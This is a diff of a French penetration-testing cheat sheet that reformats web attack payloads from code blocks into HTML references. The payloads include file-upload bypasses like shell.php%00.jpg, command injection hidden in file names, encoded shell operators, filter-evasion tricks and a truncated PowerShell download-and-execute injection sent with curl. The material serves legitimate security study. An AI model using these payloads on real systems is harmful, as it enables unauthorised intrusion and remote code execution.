@@ -1442,6 +1442,8 @@ Examiner les entrées et les réponses de l'application web.
 
 
 
+<p class="oscp-command-note">Exemples d'extensions doubles</p>
+
 ```text
 .jpeg.php
 .jpg.php
@@ -1540,10 +1542,7 @@ if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
 
 
 
-```text
-shell.php%00.jpg
-
-```
+<p class="oscp-inline-ref"><strong>Exemple de valeur web :</strong> <code>shell.php%00.jpg</code></p>
 
 
 
@@ -1665,10 +1664,7 @@ file$(whoami).jpg
 
 
 
-```text
-file.jpg||whoami
-
-```
+<p class="oscp-inline-ref"><strong>Exemple de valeur web :</strong> <code>file.jpg||whoami</code></p>
 
 
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
@@ -2686,16 +2682,10 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 
 
 
-```text
-'admin'
-
-```
+<p class="oscp-inline-ref"><strong>Valeur ou caractère de référence :</strong> <code>'admin'</code></p>
 
 
-```text
-'admin'
-
-```
+<p class="oscp-inline-ref"><strong>Valeur ou caractère de référence :</strong> <code>'admin'</code></p>
 
 
 <p class="oscp-command-note">Instruction SQL dans la rubrique « SQL Truncation ».</p>
@@ -3377,16 +3367,10 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
 
-```text
-download.php?filename=ZmlsZV8xMjMucGRm
-
-```
+<p class="oscp-inline-ref"><strong>Exemple de valeur web :</strong> <code>download.php?filename=ZmlsZV8xMjMucGRm</code></p>
 
 
-```text
-download.php?filename=c81e728d9d4c2f636f067f89cc14862c
-
-```
+<p class="oscp-inline-ref"><strong>Exemple de valeur web :</strong> <code>download.php?filename=c81e728d9d4c2f636f067f89cc14862c</code></p>
 
 
 <p class="oscp-command-note">Extrait JavaScript lié à « Hashing &amp; Encoding ».</p>
@@ -3507,10 +3491,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ```
 
 
-```text
-%3b
-
-```
+<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%3b</code></p>
 
 
 **New Line**
@@ -3535,10 +3516,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ```
 
 
-```text
-%26
-
-```
+<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%26</code></p>
 
 
 **Pipe**
@@ -3552,10 +3530,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ```
 
 
-```text
-%7c
-
-```
+<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%7c</code></p>
 
 
 **AND**
@@ -3569,10 +3544,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ```
 
 
-```text
-%26%26
-
-```
+<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%26%26</code></p>
 
 
 **OR**
@@ -3586,10 +3558,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ```
 
 
-```text
-%7c%7c
-
-```
+<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%7c%7c</code></p>
 
 
 **Sub-Shell**
@@ -3614,10 +3583,7 @@ $()
 ```
 
 
-```text
-%24%28%29
-
-```
+<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%24%28%29</code></p>
 
 
 #### Space is Blacklisted
@@ -3625,16 +3591,10 @@ $()
 
 
 
-```text
-%09
-
-```
+<p class="oscp-inline-ref"><strong>Séquence encodée pour un test web :</strong> <code>%09</code></p>
 
 
-```text
-$IFS
-
-```
+<p class="oscp-inline-ref"><strong>Valeur ou caractère de référence :</strong> <code>$IFS</code></p>
 
 
 ```json
@@ -3688,16 +3648,10 @@ Example: w'h'o'am'i
 ```
 
 
-```text
-\
-
-```
+<p class="oscp-inline-ref"><strong>Valeur ou caractère de référence :</strong> <code>\</code></p>
 
 
-```text
-$@
-
-```
+<p class="oscp-inline-ref"><strong>Valeur ou caractère de référence :</strong> <code>$@</code></p>
 
 
 
@@ -3712,10 +3666,7 @@ Examples:
 
 
 
-```text
-^
-
-```
+<p class="oscp-inline-ref"><strong>Valeur ou caractère de référence :</strong> <code>^</code></p>
 
 
 
